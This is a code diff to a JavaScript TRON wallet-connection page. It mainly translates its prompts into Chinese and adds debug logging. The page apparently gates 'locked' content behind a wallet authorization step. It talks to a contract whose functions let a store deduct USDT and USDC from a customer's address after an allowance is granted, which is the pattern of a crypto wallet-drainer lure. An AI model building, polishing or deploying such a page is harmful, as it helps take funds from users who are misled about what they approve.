@@ -9,7 +9,7 @@ const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
 const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 // --- 狀態變數 ---
-let tronWeb; // 保持 TronWeb
+let tronWeb;
 let userAddress;
 let merchantContract;
 let usdtContract;
@@ -30,7 +30,8 @@ function showOverlay(message) {
     blurOverlay.style.display = 'flex';
 }
 function hideOverlay() {
-    overlayMessage.innerHTML = '正在连接...'; // 可以考虑修改为其他消息
+    //  修改：让 hideOverlay 清空文字
+    overlayMessage.innerHTML = '';
     blurOverlay.style.display = 'none';
 }
 
@@ -58,13 +59,13 @@ function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connected) {
         connectButton.classList.add('connected');
-        connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
-        connectButton.title = `Connected: ${address}`;
-        showOverlay('Connected. Checking authorization status...');
+        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
+        connectButton.title = `已連線: ${address}`;
+        showOverlay('已連線。正在檢查授權狀態...');
     } else {
         connectButton.classList.remove('connected');
         connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
-        connectButton.title = 'Connect Wallet';
+        connectButton.title = '連繫錢包';
         updateContentLock(false); //  恢复锁定的状态
         hideOverlay();
     }
@@ -76,7 +77,7 @@ let txCount = 0;
 // 修正：新增 totalTxs 參數，移除輪詢
 async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
     txCount++;
-    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);
+    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
 
     try {
         const txHash = await methodCall.send({
@@ -87,20 +88,20 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
 
         // 嚴格檢查 txHash 是否有效
         if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
-            throw new Error(`TronLink/Wallet did not return a valid transaction hash. Possible reasons: operation was canceled or broadcast failed.`);
+            throw new Error(`TronLink/錢包未返回有效操作哈希。可能原因：操作被取消或廣播失敗。`);
         }
 
         // 🚨 樂觀判斷：立即返回成功
-        showOverlay(`Step ${txCount}/${totalTxs}: Authorization operation broadcast successful!`);
+        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
         await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒以緩衝 UI。
 
         return txHash;
 
     } catch (error) {
-        if (error.message && error.message.includes('User canceled the operation in the wallet')) {
-            throw new Error('User canceled the operation in the wallet.');
+        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
+            throw new Error('用戶在錢包中取消了操作。');
         }
-        throw new Error(`Authorization operation failed, error message: ${error.message}`);
+        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
     }
 }
 
@@ -144,6 +145,7 @@ async function initializeContracts() {
 
 // --- 混合連線邏輯 (TronLink / WalletConnect / EVM 優先嘗試) ---
 async function connectWalletLogic() {
+    console.log("connectWalletLogic called"); // 调试
     showOverlay('正在尝试连接钱包...');
 
     try {
@@ -284,6 +286,7 @@ async function connectAndAuthorize() {
 // Post-connection processing: Executes only once for initialization
 // ---------------------------------------------
 async function handlePostConnection() {
+    console.log("handlePostConnection called");  // 调试
     if (!isConnectedFlag) return;
 
     const authSuccess = await connectAndAuthorize();
@@ -292,6 +295,7 @@ async function handlePostConnection() {
          showOverlay('✅ Authorization operation broadcast successful! Unlocking data...');
          updateContentLock(true); // 隐藏 lockedPrompt 和 blurOverlay
          await new Promise(resolve => setTimeout(resolve, 500));
+         hideOverlay();  // 确保隐藏了遮罩层
     }
 }
 
@@ -299,6 +303,7 @@ async function handlePostConnection() {
 // 主連接入口函數 (混合連線邏輯)
 // ---------------------------------------------
 async function connectWallet() {
+    console.log("connectWallet called"); // 调试
     if (connectButton) connectButton.disabled = true;
 
     if (isConnectedFlag) {
